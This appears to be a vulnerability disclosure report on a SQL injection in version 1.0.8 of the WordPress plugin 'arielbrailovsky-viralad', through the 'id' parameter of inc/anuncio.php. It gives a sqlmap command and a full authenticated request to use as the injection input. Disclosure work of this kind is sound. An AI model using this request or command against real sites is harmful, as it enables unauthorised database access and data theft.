### The data query interface of the wordpress plugin arielbrailovsky-viralad has a sql injection vulnerability.

**Official website**: https://wordpress.org/plugins/arielbrailovsky-viralad/

**Version**：1.0.8

**Route**：/wp-content/plugins/arielbrailovsky-viralad/inc/anuncio.php

**API function**: search records

**Injection parameters**: id

**Request method**：GET

**Complete vulnerability trigger related interfaces and parameters**：/wp-content/plugins/arielbrailovsky-viralad/inc/anuncio.php?id=2&nocache=0.4229143391443666&security=8kjyxf14sv26ot7dhrne

#### 1.Vulnerability analysis

In the anuncio.php file, when the request method is get, the parameter id is accepted, and the parameter is not filtered by any security method and is directly spliced into the SQL query statement, causing SQL injection.

![image-20250302201130415](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302201130415.png)

Therefore, attackers can construct malicious SQL statements based on this interface for injection.

#### 2.Vulnerability verification and exploitation

You can use sqlmap to verify the vulnerability：python sqlmap.py -r 1.txt --batch --dbms=mysql

The specific injection data packets are as follows (need to replace nocache, security in the URL and cookies in the request header after logging in)

```
GET /wp-content/plugins/arielbrailovsky-viralad/inc/anuncio.php?id=2&nocache=0.4229143391443666&security=8kjyxf14sv26ot7dhrne HTTP/1.1
Host: wp3:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://wp3:82/wp-admin/options-general.php?page
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_37a4e717093a81abe878d0b0a4b265ee=admin%7C1742114129%7C6a60c9d06464a51a9060e3fdf0020e0b; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_37a4e717093a81abe878d0b0a4b265ee=admin%7C1742114129%7C0abf1d7f8bfba5dca9d1f96d15294f9d; wp-settings-1=m6%3Do%26m9%3Do; wp-settings-time-1=1740904532; PHPSESSID=irmjinoeft5778hb5e97i155j6
Connection: close


```

![image-20250302204404843](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302204404843.png)